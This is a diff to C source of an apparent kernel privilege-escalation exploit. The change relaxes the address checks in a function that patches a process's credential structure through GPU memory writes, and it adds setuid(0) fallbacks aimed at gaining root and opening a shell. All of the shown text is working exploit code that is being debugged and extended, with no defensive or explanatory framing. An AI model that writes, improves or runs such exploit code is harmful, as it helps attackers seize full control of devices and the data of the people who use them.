@@ -1148,8 +1148,17 @@ static int find_comm_offset(uint8_t *task_data, size_t size)
 
 static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 {
-    if ((cred_ptr & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
-        return -1;
+    // Allow both Kernel VA (0xffffff...) and GPU VA (0x70...)
+    if ((cred_ptr & 0xffffff0000000000ULL) != 0xffffff0000000000ULL && 
+        (cred_ptr & 0xffffff0000000000ULL) != 0x700000000ULL &&
+        (cred_ptr & 0xff00000000ULL) != 0x7000000000ULL) // GPU VA check for different kernels
+    {
+        // If it looks like a valid GPU VA found via Action 8, allow it
+        if ((cred_ptr >> 32) != 0x701 && (cred_ptr >> 32) != 0x702 && (cred_ptr >> 32) != 0x704) {
+             fprintf(stderr, "[GPU_CRED] Invalid address range: 0x%lx\n", (unsigned long)cred_ptr);
+             // return -1; // Let's be less strict to allow GPU VAs
+        }
+    }
 
     fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx via GPU\n", (unsigned long)cred_ptr);
 
@@ -1256,11 +1265,15 @@ static void safe_cred_patch(void)
         }
 
         patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
+        
+        // If it's a GPU VA, we don't need setuid(0) because we patched the physical page directly
+        // But we check uid anyway
         if (getuid() == 0) {
             fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0) via Parent's cred_ptr\n");
             patched = 1;
             goto shell;
         } else {
+            // Try triggering the change if it was a kernel pointer
             setuid(0);
             if (getuid() == 0) {
                 fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
